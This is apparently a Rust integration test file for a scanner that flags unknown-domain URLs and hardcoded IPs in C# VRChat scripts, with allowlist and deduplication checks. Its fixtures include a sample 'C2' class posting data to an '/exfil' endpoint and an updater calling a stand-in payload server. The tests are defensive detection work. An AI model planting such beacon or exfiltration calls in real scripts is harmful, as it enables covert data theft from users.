//! Integration tests — URL and IP address detection in C# scripts.

use vrcstorage_scanner::analysis::scripts::analyze_script;
use vrcstorage_scanner::report::FindingId;

// ─────────────────────────────────────────────
// Unknown domain URLs
// ─────────────────────────────────────────────

#[test]
fn unknown_domain_url_flagged() {
    let source = r#"
using System.Net.Http;

public class Updater {
    string server = "https://evil-payload-server.ru/update";
    async void Check() {
        var c = new HttpClient();
        await c.GetAsync(server);
    }
}
"#;
    let findings = analyze_script(source, "Assets/Scripts/Updater.cs");
    let has = findings.iter().any(|f| f.id == FindingId::CsUrlUnknownDomain);
    assert!(has, "CS_URL_UNKNOWN_DOMAIN not flagged; got: {:#?}", findings);
}

#[test]
fn hardcoded_ip_address_flagged() {
    let source = r#"
using System.Net.Http;

public class C2 {
    string c2 = "http://192.168.1.100/exfil";
    async void Send(string data) {
        var h = new HttpClient();
        await h.PostAsync(c2, null);
    }
}
"#;
    let findings = analyze_script(source, "Assets/Scripts/C2.cs");
    let has = findings.iter().any(|f| f.id == FindingId::CsIpHardcoded);
    assert!(has, "CS_IP_HARDCODED not detected; got: {:#?}", findings);
}

#[test]
fn whitelisted_vrchat_domain_not_flagged() {
    let source = r#"
using UnityEngine;
using VRC.SDK3.Components;

public class WebPanel : MonoBehaviour {
    string url = "https://vrchat.com/home";
}
"#;
    let findings = analyze_script(source, "Assets/Scripts/WebPanel.cs");

    // vrchat.com is on the safe-domain whitelist — should NOT produce URL findings
    let url_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.id == FindingId::CsUrlUnknownDomain || f.id == FindingId::CsIpHardcoded)
        .collect();
    assert!(
        url_findings.is_empty(),
        "vrchat.com should be whitelisted; got: {:#?}",
        url_findings
    );
}

#[test]
fn github_url_not_flagged() {
    let source = r#"
public class Info {
    string repo = "https://github.com/vrchat-community/UdonSharp";
}
"#;
    let findings = analyze_script(source, "Assets/Scripts/Info.cs");
    let url_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.id == FindingId::CsUrlUnknownDomain || f.id == FindingId::CsIpHardcoded)
        .collect();
    assert!(
        url_findings.is_empty(),
        "github.com should be whitelisted; got: {:#?}",
        url_findings
    );
}

#[test]
fn multiple_unknown_urls_each_reported_once() {
    // Same URL appearing twice should only produce one finding (deduplication)
    let source = r#"
public class D {
    string a = "https://malware.example.com/a";
    string b = "https://malware.example.com/a";   // duplicate
    string c = "https://another-bad-domain.net/b"; // distinct
}
"#;
    let findings = analyze_script(source, "Assets/Scripts/D.cs");
    let url_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.id == FindingId::CsUrlUnknownDomain)
        .collect();

    // "malware.example.com" once + "another-bad-domain.net" once = 2 total
    assert_eq!(
        url_findings.len(),
        2,
        "Expected exactly 2 URL findings (with deduplication), got: {:#?}",
        url_findings
    );
}
